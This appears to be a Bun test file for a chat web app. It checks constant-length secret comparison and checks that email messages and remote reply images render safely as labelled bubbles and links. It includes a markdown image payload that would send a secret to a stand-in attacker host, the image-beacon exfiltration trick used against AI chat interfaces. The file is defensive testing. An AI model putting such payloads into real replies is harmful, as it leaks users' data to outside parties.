import { expect, test } from "bun:test";
import { readFileSync } from "node:fs";
import { join } from "node:path";
import { createHash, timingSafeEqual } from "node:crypto";

const server = readFileSync(join(import.meta.dir, "server.ts"), "utf8");
const app = readFileSync(join(import.meta.dir, "public/app.js"), "utf8");

test("secret comparison always compares two fixed-length digests", () => {
  const start = server.indexOf("function timingSafeEqual(a: string, b: string): boolean {");
  const end = server.indexOf("\n}", start) + 2;
  const source = server.slice(start, end).replace("a: string, b: string): boolean", "a, b)").replace("value: string", "value");
  const lengths: number[][] = [];
  const compare = new Function("createHash", "bufferTimingSafeEqual", `${source}; return timingSafeEqual;`)(createHash, (a: Buffer, b: Buffer) => {
    lengths.push([a.length, b.length]);
    return timingSafeEqual(a, b);
  });
  expect(compare("secret", "secret")).toBe(true);
  for (const other of ["", "s", "secreu", "secret-extra", "sëcret"]) expect(compare("secret", other)).toBe(false);
  expect(lengths).toEqual(Array.from({ length: 6 }, () => [32, 32]));
});

test("mail is a labelled foreign bubble and remote reply images are links", () => {
  const pure = app.slice(app.indexOf("  function escapeHtml(text) {"), app.indexOf("  function appearanceTextColors(background) {"));
  const markdown = app.slice(app.indexOf("  function renderMarkdown(text) {"), app.indexOf("  const approvalStates = new Map();"));
  const add = app.slice(app.indexOf("  function createMessageBubble("), app.indexOf("  function addVoiceMessage(role,"));
  const nodes: any[] = [];
  const document = { createElement: () => ({ className: "", innerHTML: "", setAttribute() {}, addEventListener() {} }) };
  const render = new Function("document", "nodes", `
    const t = key => key;
    const location = { origin: "https://app.example" };
    const window = {};
    const messageIds = new Set();
    let lastSeenTs = "", workingEl = null;
    const showTyping = () => {}, atBottom = () => true, scrollToBottom = () => {}, addKeptActions = () => {};
    const messagesEl = { appendChild: node => nodes.push(node) };
    ${pure}\n${markdown}\n${add}
    return addMessage;
  `)(document, nodes);
  const payload = "![x](https://attacker.test/beacon?secret=42)";
  render("user", payload, "", "mail-1", undefined, undefined, undefined, undefined, { source: "email", from: 'Sender <mail@example.test>' });
  render("assistant", payload, "", "reply-1");
  render("assistant", "![own](/api/images/own.png)", "", "reply-2");
  render("assistant", "caption", "", "reply-3", "https://app.example/api/images/absolute.png");
  render("assistant", "caption", "", "reply-4", "https://attacker.test/field.png");
  expect(nodes[0].className).toBe("message email");
  expect(nodes[0].innerHTML).toContain("Sender &lt;mail@example.test&gt;");
  expect(nodes[0].innerHTML).toContain(payload.replace(/&/g, "&amp;"));
  expect(nodes[0].innerHTML).not.toContain("<img");
  expect(nodes[1].innerHTML).not.toContain("<img");
  expect(nodes[1].innerHTML).toContain('<a href="https://attacker.test/beacon?secret=42"');
  expect(nodes[2].innerHTML).toContain('<img src="/api/images/own.png"');
  expect(nodes[3].innerHTML).toContain('<img src="/api/images/absolute.png"');
  expect(nodes[4].innerHTML).not.toContain("<img");
  expect(nodes[4].innerHTML).toContain('<a href="https://attacker.test/field.png"');
});
